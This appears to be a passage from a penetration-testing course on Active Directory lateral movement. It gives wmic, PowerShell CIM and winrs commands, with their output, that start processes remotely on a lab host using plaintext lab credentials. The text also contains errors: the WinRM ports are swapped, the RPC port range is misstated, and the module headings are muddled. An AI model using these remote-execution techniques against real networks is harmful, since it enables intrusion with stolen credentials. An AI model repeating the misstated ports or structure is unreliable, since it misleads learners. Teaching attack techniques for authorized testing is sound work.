# Module: Lateral Movement in Active Directory

## 22.3 Wrapping Up
In this module, we explored NTLM and Kerberos authentication, which are essential for penetration testers to understand when performing assessments in Active Directory (AD) environments. Without a solid grasp of these authentication methods, it is challenging to comprehend the technical underpinnings of the attacks demonstrated in this module. These techniques often need to be adapted to be effective in real-world scenarios.

The attack methods covered in this module provide the necessary skills to perform attacks on AD authentication, enabling us to obtain valid user credentials and gain access to systems and services. In the next module, "Lateral Movement in Active Directory," we will build on this knowledge to move laterally within an AD environment.

## 23. Lateral Movement in Active Directory

### 23.1 Active Directory Lateral Movement Techniques
This learning unit covers the following objectives:
- Understand WMI, WinRS, and WinRM lateral movement techniques.
- Abuse PsExec for lateral movement.
- Learn about Pass The Hash and Overpass The Hash as lateral movement techniques.
- Misuse DCOM to move laterally.

Lateral Movement is a tactic that involves various techniques aimed at gaining further access within the target network. As described in the MITRE Framework, these techniques may use current valid accounts or reuse authentication materials such as password hashes, Kerberos tickets, and application access tokens obtained from previous attack stages. This learning unit will explore various techniques involving both valid accounts and previously retrieved credentials.

### 23.1.1 WMI and WinRM

#### Windows Management Instrumentation (WMI)
WMI is an object-oriented feature that facilitates task automation. It can create processes via the `Create` method from the `Win32_Process` class. WMI communicates through Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

To demonstrate this technique, we will first use the deprecated `wmic` utility and then showcase the same WMI attack via PowerShell.

**Example using `wmic`:**
```bash
C:\Users\jeff> wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
ProcessId = 752;
ReturnValue = 0;
};
```

**Example using PowerShell:**

1. **Create a PSCredential object:**
   ```powershell
   $username = 'jen';
   $password = 'Nexus123!';
   $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
   ```

2. **Create a CIM session:**
   ```powershell
   $options = New-CimSessionOption -Protocol DCOM
   $session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
   $command = 'calc';
   ```

3. **Invoke the WMI method:**
   ```powershell
   Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}
   ```

4. **Verify the process creation:**
   ```powershell
   PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
   ProcessId ReturnValue PSComputerName
   --------- ----------- --------------
   3712 0 192.168.50.73
   ```

#### Windows Remote Management (WinRM)
WinRM is Microsoft's implementation of the WS-Management protocol, which exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP.

**Example using `winrs`:**
```bash
C:\Users\jeff> winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
FILES04
corp\jen
```

### 23.2 Active Directory Persistence
In this section, we will cover techniques for maintaining access and persistence within an Active Directory environment. This includes methods to ensure continued access even after initial entry points are closed.

By understanding and applying these lateral movement and persistence techniques, penetration testers can effectively navigate and maintain control within an Active Directory environment.

---

**Note:** The examples and commands provided are for educational purposes only and should not be used for unauthorized activities. Always conduct penetration testing with proper authorization and within legal boundaries.